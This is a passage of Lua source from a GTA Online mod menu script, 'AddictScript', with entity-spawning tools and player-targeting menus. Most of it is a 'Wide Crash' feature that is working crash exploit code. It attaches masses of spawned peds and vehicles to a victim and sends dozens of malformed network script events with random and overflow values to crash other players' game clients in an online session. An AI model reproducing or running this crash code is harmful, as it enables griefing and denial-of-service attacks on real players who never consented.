					ui.draw_text("| Vehicle |", v2(0.5, 0.925))
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("X - Delete | B - Copy Hash | K - Explode | N - Engine | U - Burn | H - Enter | C - Freeze", v2(0.5, 0.95))
					if controls.is_disabled_control_just_pressed(0, 323) then
						utilities.request_control(controls_entity_aimed_at)
						entity_func.hard_remove_entity(controls_entity_aimed_at)
					elseif controls.is_disabled_control_just_pressed(0, 29) then
						utils.to_clipboard(entity.get_entity_model_hash(controls_entity_aimed_at))
						menu.notify("Copied Hash! - " .. entity.get_entity_model_hash(controls_entity_aimed_at) .. "", AddictScript)
					elseif controls.is_disabled_control_just_pressed(0, 311) then
						fire.add_explosion(entity.get_entity_coords(controls_entity_aimed_at), 0, true, false, 0.1, controls_entity_aimed_at)
					elseif controls.is_disabled_control_just_pressed(0, 306) then
						utilities.request_control(controls_entity_aimed_at)
						vehicle.set_vehicle_engine_health(controls_entity_aimed_at, -1)
					elseif controls.is_disabled_control_just_pressed(0, 303) then
						utilities.request_control(controls_entity_aimed_at)
						vehicle.set_vehicle_engine_health(controls_entity_aimed_at, -1.0)
						natives.SET_VEHICLE_PETROL_TANK_HEALTH(controls_entity_aimed_at, -1.0)
					elseif controls.is_disabled_control_just_pressed(0, 304) then
						utilities.request_control(controls_entity_aimed_at)
						if ped.is_ped_a_player(vehicle.get_ped_in_vehicle_seat(controls_entity_aimed_at, -1)) then
							ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), controls_entity_aimed_at, -2)
						else
							utilities.request_control(vehicle.get_ped_in_vehicle_seat(controls_entity_aimed_at, -1))
							utilities.request_control(controls_entity_aimed_at)
							ped.set_ped_into_vehicle(vehicle.get_ped_in_vehicle_seat(controls_entity_aimed_at, -1), controls_entity_aimed_at, -2)
							ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), controls_entity_aimed_at, -1)
						end
					end
					if controls.is_disabled_control_pressed(0, 324) then
						entity.freeze_entity(controls_entity_aimed_at, true)
					else
						entity.freeze_entity(controls_entity_aimed_at, false)
					end
				elseif entity.is_entity_an_object(controls_entity_aimed_at) then
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("| Object |", v2(0.5, 0.925))
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("X - Delete | B - Copy Hash", v2(0.5, 0.95))
					if controls.is_disabled_control_just_pressed(0, 323) then
						utilities.request_control(controls_entity_aimed_at)
						entity_func.hard_remove_entity(controls_entity_aimed_at)
					elseif controls.is_disabled_control_just_pressed(0, 29) then
						utils.to_clipboard(entity.get_entity_model_hash(controls_entity_aimed_at))
						menu.notify("Copied Hash! - " .. entity.get_entity_model_hash(controls_entity_aimed_at) .. "", AddictScript)
					end
				end
			end
		end
	end
end)

feature["Spawn Entity"] = menu.add_feature("Spawn Entity", "action_value_str", localparents["Spawner"].id, function(f)
	local input_stat, input_val = input.get("Enter Hash Model", "", 99, 0)
	if input_stat == 1 then
		return HANDLER_CONTINUE
	end
	if input_stat == 2 then
		return HANDLER_POP
	end
	if input_val ~= nil then
		if math.type(math.tointeger(input_val)) == nil then
			input_val = gameplay.get_hash_key(tostring(input_val))
		end
	end
	if input_val ~= nil then
		input_val = math.tointeger(input_val)
		if math.type(input_val) == "integer" then
			if streaming.is_model_valid(input_val) then
				utilities.request_model(input_val)
				if f.value == 0 then
					ped.create_ped(0, input_val, utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 5, 1), player.get_player_heading(player.player_id()), true, false)
					menu.notify("Successfully spawned ped (" .. string.format("%x", input_val) .. ")", AddictScript, 6, NotifyColours["green"])
				elseif f.value == 1 then
					vehicle.create_vehicle(input_val, utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 5, 1), player.get_player_heading(player.player_id()), true, false)
					menu.notify("Successfully spawned vehicle (" .. string.format("%x", input_val) .. ")", AddictScript, 6, NotifyColours["green"])
				elseif f.value == 2 then
					object.create_object(input_val, utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 5, 1), true, true)
					menu.notify("Successfully spawned object (" .. string.format("%x", input_val) .. ")", AddictScript, 6, NotifyColours["green"])
				else
					object.create_world_object(input_val, utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), 5, 1), true, true)
					menu.notify("Successfully spawned world object (" .. string.format("%x", input_val) .. ")", AddictScript, 6, NotifyColours["green"])
				end
			end
		end
	end
end)
feature["Spawn Entity"]:set_str_data({"Ped", "Vehicle", "Object", "World Object"})

localparents["Xml Vehicles"] = menu.add_feature("Xml Vehicles", "parent", localparents["Spawner"].id)

localparents["Spawner Options"] = menu.add_feature("Spawner Options", "parent", localparents["Xml Vehicles"].id)

feature["Spawn Inside Vehicle"] = menu.add_feature("Spawn Inside Vehicle", "toggle", localparents["Spawner Options"].id, function(f)
end)

feature["Forward Vector Offset"] = menu.add_feature("Forward Vector Offset", "autoaction_value_i", localparents["Spawner Options"].id, function(f)
end)
feature["Forward Vector Offset"].max = 20
feature["Forward Vector Offset"].min = 0
feature["Forward Vector Offset"].mod = 1
feature["Forward Vector Offset"].value = 6

feature["Always Spawn Maxed"] = menu.add_feature("Always Spawn Maxed", "toggle", localparents["Spawner Options"].id, function(f)
end)

feature["Spawn In Air"] = menu.add_feature("Spawn In Air", "toggle", localparents["Spawner Options"].id, function(f)
end)

feature["Spawn In Godmode"] = menu.add_feature("Spawn In Godmode", "toggle", localparents["Spawner Options"].id, function(f)
end)

feature["Small Boost"] = menu.add_feature("Small Boost", "toggle", localparents["Spawner Options"].id, function(f)
end)

local all_spawned_xml_vehicles = {}

feature["Delete All Spawned Vehicles"] = menu.add_feature("Delete All Spawned Vehicles", "action", localparents["Spawner Options"].id, function(f)
	for i = 1, #all_spawned_xml_vehicles do
		if entity.is_an_entity(all_spawned_xml_vehicles[i]) then
			utilities.request_control(all_spawned_xml_vehicles[i])
			entity_func.hard_remove_entity(all_spawned_xml_vehicles[i])
		end
	end
	all_spawned_xml_vehicles = {}
end)

do
	local xml_features = {}
	local xml_count = 0
	local xml_files = utils.get_all_files_in_directory(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, ""), "xml")
	for i = 1, #xml_files do
		xml_count = xml_count + 1
		local real_count = xml_count
		xml_features[real_count] = menu.add_feature(text_func.split_string(xml_files[i], ".xml")[1], "action_value_str", localparents["Xml Vehicles"].id, function(f)
			if player.is_player_valid(player.player_id()) then
				if f.value == 0 then
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, xml_files[i])) then
						local vehicle_ = xml_handler.spawn_vehicle(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, xml_files[i]), utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), feature["Forward Vector Offset"].value, 1), player.get_player_heading(player.player_id()))
						if vehicle_ ~= nil then
							all_spawned_xml_vehicles[#all_spawned_xml_vehicles + 1] = vehicle_
							network.request_control_of_entity(vehicle_)
							entity.freeze_entity(vehicle_, false)
							if feature["Always Spawn Maxed"].on then
								utilities.max_vehicle(vehicle_)
							end
							if feature["Spawn In Air"].on then
								if streaming.is_model_a_plane(entity.get_entity_model_hash(vehicle_)) or streaming.is_model_a_heli(entity.get_entity_model_hash(vehicle_)) then
									entity.set_entity_coords_no_offset(vehicle_, v3(entity.get_entity_coords(vehicle_).x, entity.get_entity_coords(vehicle_).y, entity.get_entity_coords(vehicle_).z + 48))
								end
							end
							if feature["Spawn Inside Vehicle"].on then
								ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), vehicle_, -1)
								entity.freeze_entity(vehicle_, false)
							end
							entity.set_entity_god_mode(vehicle_, feature["Spawn In Godmode"].on)
							if feature["Small Boost"].on then
								if streaming.is_model_a_plane(entity.get_entity_model_hash(vehicle_)) or streaming.is_model_a_heli(entity.get_entity_model_hash(vehicle_)) then
									vehicle.set_vehicle_forward_speed(vehicle_, 100)
								end
							end
						end
					end
				else
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, xml_files[i])) then
						io.remove(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, xml_files[i]))
						menu.delete_feature(xml_features[real_count].id)
					end
				end
			end
		end)
		xml_features[real_count]:set_str_data({"Spawn", "Delete"})
	end
	local xml_dirs = utils.get_all_sub_directories_in_directory(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, ""))
	for i = 1, #xml_dirs do
		localparents["Menyoo Spawner Folder " .. i] = menu.add_feature(xml_dirs[i], "parent", localparents["Xml Vehicles"].id)
		local xml_files = utils.get_all_files_in_directory(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles, xml_dirs[i]), "xml")
		for b = 1, #xml_files do
			xml_count = xml_count + 1
			local real_count = xml_count
			xml_features[real_count] = menu.add_feature(text_func.split_string(xml_files[b], ".xml")[1], "action_value_str", localparents["Menyoo Spawner Folder " .. i].id, function(f)
				if player.is_player_valid(player.player_id()) then
					if f.value == 0 then
						if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles .. "\\" .. xml_dirs[i], xml_files[b])) then
							local vehicle_ = xml_handler.spawn_vehicle(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles .. "\\" .. xml_dirs[i], xml_files[b]), utilities.offset_coords(player.get_player_coords(player.player_id()), player.get_player_heading(player.player_id()), feature["Forward Vector Offset"].value, 1), player.get_player_heading(player.player_id()))
							if vehicle_ ~= nil then
								all_spawned_xml_vehicles[#all_spawned_xml_vehicles + 1] = vehicle_
								network.request_control_of_entity(vehicle_)
								entity.freeze_entity(vehicle_, false)
								if feature["Always Spawn Maxed"].on then
									utilities.max_vehicle(vehicle_)
								end
								if feature["Spawn In Air"].on then
									if streaming.is_model_a_plane(entity.get_entity_model_hash(vehicle_)) or streaming.is_model_a_heli(entity.get_entity_model_hash(vehicle_)) then
										entity.set_entity_coords_no_offset(vehicle_, v3(entity.get_entity_coords(vehicle_).x, entity.get_entity_coords(vehicle_).y, entity.get_entity_coords(vehicle_).z + 48))
									end
								end
								if feature["Spawn Inside Vehicle"].on then
									ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), vehicle_, -1)
									entity.freeze_entity(vehicle_, false)
								end
								entity.set_entity_god_mode(vehicle_, feature["Spawn In Godmode"].on)
								if feature["Small Boost"].on then
									if streaming.is_model_a_plane(entity.get_entity_model_hash(vehicle_)) or streaming.is_model_a_heli(entity.get_entity_model_hash(vehicle_)) then
										vehicle.set_vehicle_forward_speed(vehicle_, 100)
									end
								end
							end
						end
					else
						if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles .. "\\" .. xml_dirs[i], xml_files[b])) then
							io.remove(utils.get_appdata_path(Paths.AddictScriptCfg.XmlVehicles .. "\\" .. xml_dirs[i], xml_files[b]))
							menu.delete_feature(xml_features[real_count].id)
						end
					end
				end
			end)
			xml_features[real_count]:set_str_data({"Spawn", "Delete"})
		end
	end
end

localparents["Xml Maps"] = menu.add_feature("Xml Maps", "parent", localparents["Spawner"].id)

menu.add_feature("Coming Soon:tm:", "action", localparents["Xml Maps"].id, function(f)
end)

playerparents["AddictScript"] = menu.add_player_feature("AddictScript", "parent", 0)
playerparents["Player Options"] = menu.add_player_feature("Player Options", "parent", playerparents["AddictScript"].id)
playerparents["Crashes And Kicks"] = menu.add_player_feature("Crashes And Kicks", "parent", playerparents["Crashes And Kicks"]).id
playerparents["Lobby Crashes"] = menu.add_player_feature("Lobby Crashes", "parent", playerparents["Crashes And Kicks"]).id

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

menu.add_player_feature("Wide Crash (R0) Can Freeze Stand", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		utilities.request_model(0x303638A7)
		local table_of_all_peds = {}
		local table_of_all_vehicles = {}
        local hashes = {956849991, 1133471123, 2803699023, 386089410, 1549009676}
		local yo_momma = ped.create_ped(0, 0x303638A7, player.get_player_coords(pid) + v3(300, 300, 300), entity.get_entity_heading(player.get_player_ped(pid)), true, false)
		network.request_control_of_entity(yo_momma)
		for i = 1, 5 do
			table_of_all_peds[i] = ped.create_ped(0, 0x3F039CBA, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
			network.request_control_of_entity(table_of_all_peds[i])
			entity.attach_entity_to_entity(table_of_all_peds[i], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
			table_of_all_peds[i + 5] = ped.create_ped(0, 0x856CFB02, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
			network.request_control_of_entity(table_of_all_peds[i + 5])
			entity.attach_entity_to_entity(table_of_all_peds[i + 5], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
			table_of_all_peds[i + 10] = ped.create_ped(0, 0x2D7030F3, player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
			network.request_control_of_entity(table_of_all_peds[i + 10])
			entity.attach_entity_to_entity(table_of_all_peds[i + 10], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, true, 0, true)
		end
        for i = 1, #hashes do
            utilities.request_model(hashes[i])
            table_of_all_vehicles[i] = vehicle.create_vehicle(hashes[i], player.get_player_coords(pid) + v3(300, 300, 300), 0, true, false)
            network.request_control_of_entity(table_of_all_vehicles[i])
			entity.attach_entity_to_entity(table_of_all_vehicles[i], yo_momma, 0, v3(0, 0, 0), v3(0, 0, 0), true, false, false, 0, true)
        end
		system.wait(0)
		network.request_control_of_entity(yo_momma)
		entity.set_entity_coords_no_offset(yo_momma, player.get_player_coords(pid))
		system.wait(2000)
		for i = 1, 15 do
			if entity.is_an_entity(table_of_all_peds[i]) then
				network.request_control_of_entity(table_of_all_peds[i])
				entity.delete_entity(table_of_all_peds[i])
			end
		end
		for i = 1, 5 do
			if entity.is_an_entity(table_of_all_vehicles[i]) then
				network.request_control_of_entity(table_of_all_vehicles[i])
				entity.delete_entity(table_of_all_vehicles[i])
			end
		end
		if yo_momma then
			network.request_control_of_entity(yo_momma)
			utilities.hard_remove_entity(yo_momma)
		end
		system.wait(1)
		script.trigger_script_event(-371781708, pid, {player.player_id(), pid, pid, 1403904671})
		system.wait(1)
		script.trigger_script_event(-317318371, pid, {player.player_id(), pid, pid, 1993236673})
		system.wait(1)
		script.trigger_script_event(911179316, pid, {player.player_id(), pid, pid, pid, 1234567990, pid, pid})
		system.wait(1)
		script.trigger_script_event(846342319, pid, {player.player_id(), 578162304, 1})
		system.wait(1)
		script.trigger_script_event(-2085853000, pid, {player.player_id(), pid, 1610781286, pid, pid})
		system.wait(1)
		script.trigger_script_event(-1991317864, pid, {player.player_id(), 3, 935764694, pid, pid})
		system.wait(1)
		script.trigger_script_event(-1970125962, pid, {player.player_id(), pid, 1171952288})
		system.wait(1)
		script.trigger_script_event(-1013679841, pid, {player.player_id(), pid, 2135167326, pid})
		system.wait(1)
		script.trigger_script_event(-1767058336, pid, {player.player_id(), 1459620687})
		system.wait(1)
		script.trigger_script_event(-1892343528, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(1494472464, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(69874647, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(998716537, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(522189882, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(1514515570, pid, {player.player_id(), pid, 2147483647})
		system.wait(1)
		script.trigger_script_event(-393294520, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(-1386010354, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(962740265, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
		system.wait(1)
		script.trigger_script_event(296518236, pid, {player.player_id(), pid, pid, pid, 1})
		system.wait(1)
		script.trigger_script_event(-1782442696, pid, {player.player_id(), 420, 69})
		system.wait(1)
		for i = 1, 5 do
			script.trigger_script_event(-1782442696, pid, {player.player_id(), math.random(-2147483647, 2147483647), 0})
			system.wait(1)
		end
		script.trigger_script_event(924535804, pid, {pid, math.random(-2147483647, 2147483647), 0})
		system.wait(1)
		script.trigger_script_event(436475575, pid, {pid, math.random(-2147483647, 2147483647), 0})
		system.wait(1)
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, -788905164})
		script.trigger_script_event(962740265, pid, {player.player_id(), 4294894682, -4294904289, -788905164})
		script.trigger_script_event(962740265, pid, {-72614, 63007, 59027, -12012, -26996, 33398, pid})
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, -72614, 63007, 59027, -12012, -26996, 33398, pid})
			utilities.request_model(1349725314)
			local vehicle_ = vehicle.create_vehicle(1349725314, utilities.offset_coords_forward(player.get_player_coords(pid), player.get_player_heading(pid), 5), player.get_player_coords(pid).z, true, false)
			network.request_control_of_entity(vehicle_)
			vehicle.set_vehicle_mod_kit_type(vehicle_, 0)
			vehicle.set_vehicle_mod(vehicle_, 48, 0, false)
			system.wait(25)
			utilities.request_control_silent(vehicle_)
			utilities.hard_remove_entity(vehicle_)
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, 23243, 5332, 3324, pid})
		script.trigger_script_event(962740265, pid, {player.player_id(), 23243, 5332, 3324, pid})
		script.trigger_script_event(962740265, pid, {player.player_id(), pid, 30583, pid, pid, pid, pid, -328966, 10128444})
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, pid, 30583, pid, pid, pid, pid, -328966, 10128444})
		script.trigger_script_event(962740265, pid, {player.player_id(), 95398, 98426, -24591, 47901, -64814})
		script.trigger_script_event(962740265, pid, {player.player_id(), 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
		script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
		script.trigger_script_event(677240627, pid, {player.player_id(), -1774405356})
  script.trigger_script_event(-2043109205, pid, {0, 0, 17302, 9822, 1999, 6777888, 111222})
  script.trigger_script_event(-2043109205, pid, {0, 0, 2327, 0, 0, 0, -307, 27777})
  script.trigger_script_event(-988842806, pid, {0, 0, 2327, 0, 0, 0, -307, 27777})
  script.trigger_script_event(-2043109205, pid, {0, 0, 27983, 7601, 1020, 3209051, 111222})
  script.trigger_script_event(-2043109205, pid, {0, 0, 1010, 0, 0, 0, -2653, 50555})
  script.trigger_script_event(-988842806, pid, {0, 0, 1111, 0, 0, 0, -5621, 57766})
  script.trigger_script_event(-988842806, pid, {0, 0, -3, -90, -123, -9856, -97652})
  script.trigger_script_event(-2043109205, pid, {0, 0, -3, -90, -123, -9856, -97652})
  script.trigger_script_event(-1881357102, pid, {0, 0, -3, -90, -123, -9856, -97652})
  script.trigger_script_event(-988842806, pid, {0, 0, 20547, 1058, 1245, 2721936, 666333})
  system.wait(25)
  script.trigger_script_event(-2043109205, pid, {0, 0, 20547, 1058, 1245, 2721936, 666333})
  script.trigger_script_event(-1881357102, pid, {0, 0, 20547, 1058, 1245, 2721936, 666333})
  script.trigger_script_event(153488394, pid, {0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144})
  script.trigger_script_event(153488394, pid, {0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144})
  script.trigger_script_event(1249026189, pid, {0, 0, 97587, 5697, 3211, 8237539, 967853})
  script.trigger_script_event(1033875141, pid, {0, 0, 0, 1967})
  script.trigger_script_event(1033875141, pid, {0, 0, -123, -957, -14, -1908, -123})
  script.trigger_script_event(1033875141, pid, {0, 0, 12121, 9756, 7609, 1111111, 789666})
  script.trigger_script_event(315658550, pid, {0, 0, 87111, 5782, 9999, 3333333, 888888})
  script.trigger_script_event(-877212109, pid, {0, 0, 87111, 5782, 9999, 3333333, 888888})
  script.trigger_script_event(1926582096, pid, {0, -1, -1, -1, 18899, 1011, 3070})
  script.trigger_script_event(1926582096, pid, {0, -4640169, 0, 0, 0, -36565476, -53105203})
  script.trigger_script_event(1033875141, pid, {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488,
                                                59643555, 34295654, 91870118, -3283691})
  script.trigger_script_event(-988842806, pid, {0, 0, 93})
  system.wait(25)
  script.trigger_script_event(-2043109205, pid, {0, 0, 37, 0, -7})
  script.trigger_script_event(-1881357102, pid, {0, 0, -13, 0, 0, 0, 23})
  script.trigger_script_event(153488394, pid, {0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27})
  script.trigger_script_event(1249026189, pid, {})
  script.trigger_script_event(315658550, pid, {})
  script.trigger_script_event(-877212109, pid, {})
  script.trigger_script_event(1033875141, pid, {0, 0, 0, 82})
  script.trigger_script_event(1926582096, pid, {})
  script.trigger_script_event(-977515445, pid, {26770, 95398, 98426, -24591, 47901, -64814})
  script.trigger_script_event(-1949011582, pid, {pid, -1139568479, math.random(0, 4), math.random(0, 1)})
  system.wait(25)
  script.trigger_script_event(-2043109205, pid, {0, 0, 3333, 0, 0, 0, -987, 21369})
  script.trigger_script_event(-988842806, pid, {0, 0, 2222, 0, 0, 0, -109, 73322})
  script.trigger_script_event(-977515445, pid, {26770, 95398, 98426, -24591, 47901, -64814})
  script.trigger_script_event(-1949011582, pid, {pid, -1139568479, math.random(0, 4), math.random(0, 1)})
  script.trigger_script_event(-1730227041, pid, {-494, 1526, 60541, -12988, -99097, -32105})
    script.trigger_script_event(-393294520, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    script.trigger_script_event(-1386010354, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    script.trigger_script_event(962740265, pid, {pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
script.trigger_script_event(962740265, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(962740265, pid, {player.player_id(), pid, 1001, pid})
script.trigger_script_event(-1386010354, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(-1386010354, pid, {player.player_id(), 2147483647, 2147483647, 232342, 112, 238452, 2832})
script.trigger_script_event(2112408256, pid, {player.player_id(), math.random(-1986324736, 1747413822), math.random(-1986324736, 1777712108), math.random(-1673857408, 1780088064), math.random(-2588888790, 2100146067)})
script.trigger_script_event(998716537, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(998716537, pid, {player.player_id(), pid, 1001, pid})
script.trigger_script_event(163598572, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(-1056683619, pid, {player.player_id(), pid, 1001, pid})
script.trigger_script_event(436475575, pid, {player.player_id(), 20})
script.trigger_script_event(1757755807, pid, {player.player_id(), 62, 2})
script.trigger_script_event(-1767058336, pid, {player.player_id(), 3})
script.trigger_script_event(-1013679841, pid, {player.player_id(), pid, 111})
script.trigger_script_event(-1501164935, pid, {player.player_id(), 0})
script.trigger_script_event(998716537, pid, {player.player_id(), 0})
script.trigger_script_event(163598572, pid, {player.player_id(), 0})
script.trigger_script_event(924535804, pid, {player.player_id(), 0})
script.trigger_script_event(69874647, pid, {player.player_id(), 0})
script.trigger_script_event(-1782442696, pid, {player.player_id(), 420, 69})
script.trigger_script_event(1445703181, pid, {player.player_id(), 28, 4294967295, 4294967295})
script.trigger_script_event(-1386010354, pid, {player.player_id(), 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898})
script.trigger_script_event(962740265, pid, {player.player_id(), 4294894682, -4294904289, -4294908269, 4294955284, 4294940300, -4294933898})
script.trigger_script_event(-1501164935, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(-1501164935, pid, {player.player_id(), pid, 1001, pid})
script.trigger_script_event(-0x529CD6F2, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
